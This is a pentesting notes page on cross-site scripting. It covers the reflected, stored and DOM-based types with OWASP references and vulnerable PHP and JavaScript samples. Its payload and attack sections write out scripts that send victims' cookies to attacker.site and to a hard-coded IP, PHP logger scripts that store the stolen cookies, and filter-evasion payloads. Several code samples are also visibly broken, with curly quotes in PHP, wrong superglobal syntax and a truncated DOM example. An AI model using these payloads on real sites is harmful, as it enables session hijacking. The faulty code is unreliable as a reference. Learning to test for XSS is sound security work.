---
title: XSS attack - Cross-Site Scripting
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - web pentesting
  - attack
  - xss
---

# XSS attack - Cross-Site Scripting


??? quote "OWASP reference"
	[OWASP Web Security Testing Guide 4.2](../OWASP/index.md) > 7. Data Validation Testing > 7.2. Testing for Stored Cross Site Scripting
	
	|ID|Link to Hackinglife|Link to OWASP|Description|
	|:---|:---|:---|:---|
	|7.1|[WSTG-INPV-01](../OWASP/WSTG-INPV-01.md)|[Testing for Reflected Cross Site Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)|- Identify variables that are reflected in responses.  - Assess the input they accept and the encoding that gets applied on return (if any).|
	|7.2|[WSTG-INPV-02](../OWASP/WSTG-INPV-02.md)|[Testing for Stored Cross Site Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)|- Identify stored input that is reflected on the client-side.  - Assess the input they accept and the encoding that gets applied on return (if any).|
	|11.1|[WSTG-CLNT-01](../OWASP/WSTG-CLNT-01.md)|[Testing for DOM-Based Cross Site Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)|- Identify DOM sinks.  - Build payloads that pertain to every sink type. |


Cross-Site scripting (XSS) is a client-side web vulnerability that allows attackers to inject malicious scripts into web pages. This vulnerability is typically caused by a lack of input sanitization/validation in web applications. Attackers leverage XSS vulnerabilities to inject malicious code into web applications. Because XSS is a client side vulnerability, these scripts are executed by the victims browser. XSS vulnerabilities affect web applications that lack input validation and leverage client-side scripting languages like Javascript, Flash, CSS etc.

```
# Quick steps to test XSS 
# 1. Find a reflection point (inspect source code and expand all tags to make sure that it's really a reflection point and it's not parsing your input)
# 2. Test with <i> tag
# 3. Test with HTML/JavaScript code (alert('XSS'))
```

But, of course, you may use an extensive repository of payloads. This [OWASP cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) is kind of a bible.

XSS attacks are typically exploited for the following objectives:

1. Cookie stealing/Session hijacking - Stealing cookies from users with authenticated sessions, allowing you to login as other users by leveraging the authentication information contained within a cookie.
2. Browser exploitation - Exploitation of browser vulnerabilities. 
3. Keylogging - Logging keyboard entries made by other users on a web application.
4. Phishing - Injecting fake login forms into a webpage to capture credentials.
5. ... and many more.


## Cross-Site Scripting XSS: reflected, persistent... and DOM based

**1. Reflected attacks**: malicious payload is carried inside the request that the browser sends. You need to bypass the anti-xss filters. This way when the victim clicks on it it will be sending their information to the attacker (limited to js events).  

Example:

```
http://victim.site/seach.php?find=<payload>
```

**2. Persistent or stored XSS attacks**: payload is sent to the web server and then stored. The most common vector for these attacks are HTML forms that submit content to the web server and then display that content back to the users (comments, user profiles, forum posts…). Basically if the url somehow stays in the server, then, every time that someone accesses to it, they will suffer the attack.

**3. DOM based** XSS attacks: tricky one. This time the javascript file procedes from the server, and in that sense, the file is trusteable. Nevertheless, the file modifies changes in the web structure. [Quoting OWASP](https://owasp.org/www-community/attacks/DOM_Based_XSS): "DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an unexpected manner".

### 1. Reflected Cross Site Scripting


!!! quote ""
	[OWASP Web Security Testing Guide 4.2](../OWASP/index.md) > 7. Data Validation Testing > 7.1. Testing for Reflected Cross Site Scripting

|ID|Link to Hackinglife|Link to OWASP|Description|
|:---|:---|:---|:---|
|7.1|[WSTG-INPV-01](../OWASP/WSTG-INPV-01.md) |[Testing for Reflected Cross Site Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)|- Identify variables that are reflected in responses.  - Assess the input they accept and the encoding that gets applied on return (if any).|

Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client.

[XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

#### Causes

This vulnerable PHP code in a welcome page may lead to an XSS attack:

```php
<?php $name = @$_GET['name']; ?>

Welcome <?=$name?>

```

#### a. Identify an input vector



### 2.  Persistent or stored Cross Site Scripting

Stored cross-site scripting is a vulnerability where an attacker is able to inject Javascript code into a web application’s database or source code via an input that is not sanitized. For example, if an attacker is able to inject a malicious XSS payload in to a webpage on a website without proper sanitization, the XSS payload injected in to the webpage will be  executed by the browser of anyone that visits that webpage.


#### Causes

This vulnerable PHP code in a welcome page may lead to a stored XSS attack:

```php
<?php 
$file  = 'newcomers.log';
if(@$_GET['name']){
	$current = file_get_contents($file);
	$current .= $_GET['name']."\n";
	//store the newcomer
	file_put_contents($file, $current);
}
//If admin show newcomers
if(@$_GET['admin']==1)
	echo file_get_contents($file);
?>

Welcome <?=$name?>
```



### 3.  DOM Cross Site Scripting (Type-0 or Local XSS)

The key in exploiting this XSS flaw is that the client-side script code can access the browser's DOM, thus all the information available in it. Examples of this information are the URL, history, cookies, local storage,...  Technically there are two keywords: sources and sinks. Let's use the following vulnerable code:

#### Causes


This vulnerable code in a welcome page may lead to a DOM XSS attack:
http://example.com/#w!Giuseppe

```html
<h1 id='welcome'></h1>
<script>
	var w = "Welcome";
	var name = document.location.hash.search(/#W!1)+3,
				document.location.hash.length
				);
	document.getElementById('Welcome').innerHTML = w + name;
</script>
```


>location.hash is the source of the untrusted input.
>.innerHTML is the sink where the input is used.


To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.
The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.

What is a sink? A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Summing up: you should avoid allowing data from any untrusted source to be dynamically written to the HTML document.


Which sinks can lead to DOM-XSS vulnerabilities:

- document.write()
- document.writeln() 
- document.replace()
- document.domain 
- element.innerHTML 
- element.outerHTML 
- element.insertAdjacentHTML 
- element.onevent

This project, [DOMXSS wiki](https://code.google.com/archive/p/domxsswiki/) aims to identify sources and sinks methods exposed by public, widely used javascript frameworks.


## Mitigation for cookie stealing

Depending on Enabling the HTTPOnly flag. 


## Crafted payloads

```html
<script>alert(‘lala’)</script>

<script>alert(document.cookie)</script>

<script>
var i = new Image();
i.src = “http://attacker.site/log.php?q=”+document.cookie;
</script>
```

Now, this script save the cookie in a text file on the attacker site:

```php
	<?php
		$filename=”/tmp/log.txt”;
		$fp=fopen($filename, ‘a’);
		$cookie=$_GET[‘q`];
		fwrite($fp, $cookie);
		fclose($fp);
	?>
```

## Example of an attack

1. The attacker creates a get.php file and saves it into its server. 

2. This php file will store the data that the attacker server receives into a file.

3. This could be the content of the get.php file:

```php
<?php
	$ip = $_SERVER(‘REMOTE_ADDR’);
	$browser = $_SERVER(‘HTTP_USER_AGENT’);

	$fp = fopen(‘jar.txt’, ‘a’);

fwrite($fp, $ip . ‘ ‘ . $browser . “ \n”);
fwrite($fp, urldecode($_SERVER[‘QUERY_STRING’]) . “ \n\n”);
fclose($fp);
?>
```

4. Now in the web server the attacker achieve to store this payload:

```html
<script>
var i = new Image();
i.src = “http://attacker.site/get.php?cookie=”+escape(document.cookie);
</script>

# Or in one line:
<script>var i = new Image(); i.src = “http://10.86.74.7/moville.php?cookie=”+escape(document.cookie); </script>
```




## Bypassing techniques

```
# Using uppercase and lowercase

# If first <script is removed, insert one script into another:
<scr<script>ipt>

# It single quotation (or even double quotes) is removed, you can use the function String.fromCharCode(number, number, number, number)
# 1. We lookk for a charcode calculator and enter our payload, for instance "lala" will be: 
34, 108, 97, 108, 97, 34
# 2. Them we put those numbers in our payload
<scRIpt>alert(String.fromCharCode(34, 108, 97, 108, 97, 34))</sCRiPt>

```




## Tools and payloads

+ See updated chart: [Attacks and tools for web pentesting](../OWASP/index.md).
+ Vectors (payload) regularly updated: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
+ OWASP Cheat Sheet series: XSS Filter Evasion Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).







